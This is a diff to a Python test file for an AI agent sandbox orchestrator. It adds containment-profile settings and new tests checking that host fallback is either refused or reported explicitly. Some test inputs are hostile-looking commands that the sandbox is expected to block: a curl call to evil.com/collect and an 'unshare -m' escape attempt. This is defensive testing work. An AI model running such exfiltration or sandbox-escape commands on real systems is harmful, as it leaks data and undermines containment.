@@ -23,6 +23,7 @@ from shisad.executors.sandbox import (
     SandboxOrchestrator,
     SandboxType,
 )
+from shisad.executors.sandbox.models import ContainmentProfile
 from shisad.security.credentials import CredentialConfig, InMemoryCredentialStore
 
 
@@ -37,6 +38,7 @@ def test_m3_sandbox_timeout_and_output_truncation(tmp_path: Path) -> None:
             tool_name="shell.exec",
             command=[sys.executable, "-c", "import time; time.sleep(2)"],
             limits=ResourceLimits(timeout_seconds=1, output_bytes=1024),
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         )
@@ -49,6 +51,7 @@ def test_m3_sandbox_timeout_and_output_truncation(tmp_path: Path) -> None:
             tool_name="shell.exec",
             command=[sys.executable, "-c", "print('x' * 8000)"],
             limits=ResourceLimits(timeout_seconds=5, output_bytes=128),
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         )
@@ -76,6 +79,7 @@ def test_m3_sandbox_creates_checkpoint_for_destructive_commands(tmp_path: Path) 
             filesystem=FilesystemPolicy(
                 mounts=[MountRule(path=f"{tmp_path.as_posix()}/**", mode="rw")]
             ),
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         ),
@@ -92,6 +96,7 @@ def test_m3_sandbox_blocks_escape_signals_and_network_disabled_commands() -> Non
         SandboxConfig(
             tool_name="shell.exec",
             command=["unshare", "-m"],
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         )
@@ -105,6 +110,7 @@ def test_m3_sandbox_blocks_escape_signals_and_network_disabled_commands() -> Non
             tool_name="http_request",
             command=["curl", "https://evil.com/collect"],
             network=NetworkPolicy(allow_network=False, allowed_domains=[]),
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         )
@@ -220,6 +226,7 @@ def test_m3_sandbox_injects_placeholders_into_command_and_env() -> None:
             network=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
             network_urls=["https://api.good.com/v1/send"],
             approved_by_pep=True,
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         )
@@ -247,6 +254,7 @@ def test_m3_sandbox_redacts_injected_headers_in_result_payload() -> None:
             network_urls=["https://api.good.com/v1/send"],
             request_headers={"Authorization": placeholder},
             approved_by_pep=True,
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         )
@@ -308,6 +316,7 @@ def test_m6_sandbox_connect_path_includes_literal_allowlist_scope_addresses(
             ),
             network_urls=["https://browser.example/page"],
             approved_by_pep=True,
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         )
@@ -338,6 +347,7 @@ def test_m3_sandbox_blocks_placeholder_injection_without_pep_approval() -> None:
             network=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
             network_urls=["https://api.good.com/v1/send"],
             approved_by_pep=False,
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
             degraded_mode=DegradedModePolicy.FAIL_OPEN,
             security_critical=False,
         )
@@ -399,8 +409,80 @@ def test_m3_rr2_runtime_metadata_drift_fail_closed_blocks_preinvoke(tmp_path: Pa
     )
     assert result.allowed is False
     assert result.reason == "runtime_isolation_unavailable"
+    assert "requested sandbox backend" in result.next_action
     assert "runtime_isolation" in result.degraded_controls
     assert target.exists() is False
+
+
+def test_f4b_supported_profile_never_falls_back_to_host(tmp_path: Path) -> None:
+    target = tmp_path / "supported-host-write.txt"
+    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
+    orchestrator._backends[SandboxType.NSJAIL] = SandboxBackend(
+        backend=SandboxType.NSJAIL,
+        runtime="",
+        enforcement=SandboxEnforcement(
+            filesystem=True,
+            network=True,
+            env=True,
+            seccomp=True,
+            resource_limits=True,
+            dns_control=True,
+        ),
+    )
+
+    result = orchestrator.execute(
+        SandboxConfig(
+            tool_name="shell.exec",
+            command=[sys.executable, "-c", f"open(r'{target}', 'w').write('x')"],
+            containment_profile=ContainmentProfile.SUPPORTED,
+            degraded_mode=DegradedModePolicy.FAIL_OPEN,
+            security_critical=False,
+        )
+    )
+
+    assert result.allowed is False
+    assert result.reason == "runtime_isolation_unavailable"
+    assert result.containment_profile == ContainmentProfile.SUPPORTED
+    assert result.requested_backend == SandboxType.NSJAIL
+    assert result.actual_backend is None
+    assert result.host_fallback_used is False
+    assert target.exists() is False
+
+
+def test_f4b_expert_profile_reports_explicit_host_fallback(tmp_path: Path) -> None:
+    target = tmp_path / "expert-host-write.txt"
+    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
+    orchestrator._backends[SandboxType.NSJAIL] = SandboxBackend(
+        backend=SandboxType.NSJAIL,
+        runtime="",
+        enforcement=SandboxEnforcement(
+            filesystem=True,
+            network=True,
+            env=True,
+            seccomp=True,
+            resource_limits=True,
+            dns_control=True,
+        ),
+    )
+
+    result = orchestrator.execute(
+        SandboxConfig(
+            tool_name="shell.exec",
+            command=[sys.executable, "-c", f"open(r'{target}', 'w').write('x')"],
+            containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
+            degraded_mode=DegradedModePolicy.FAIL_OPEN,
+            security_critical=False,
+        )
+    )
+
+    assert result.allowed is True
+    assert result.containment_profile == ContainmentProfile.EXPERT_HOST_FALLBACK
+    assert result.degraded_mode == DegradedModePolicy.FAIL_OPEN
+    assert result.requested_backend == SandboxType.NSJAIL
+    assert result.actual_backend == "host"
+    assert result.host_fallback_used is True
+    assert "expert_host_fallback" in result.degraded_controls
+    assert target.read_text(encoding="utf-8") == "x"
 
 
 def test_m3_rr2_unknown_runtime_wrapper_fail_closed_blocks_preinvoke(tmp_path: Path) -> None:
@@ -474,6 +556,7 @@ async def test_m3_sandbox_execute_async_does_not_block_event_loop() -> None:
                 tool_name="shell.exec",
                 command=[sys.executable, "-c", "import time; time.sleep(0.2)"],
                 limits=ResourceLimits(timeout_seconds=2, output_bytes=1024),
+                containment_profile=ContainmentProfile.EXPERT_HOST_FALLBACK,
                 degraded_mode=DegradedModePolicy.FAIL_OPEN,
                 security_critical=False,
             )
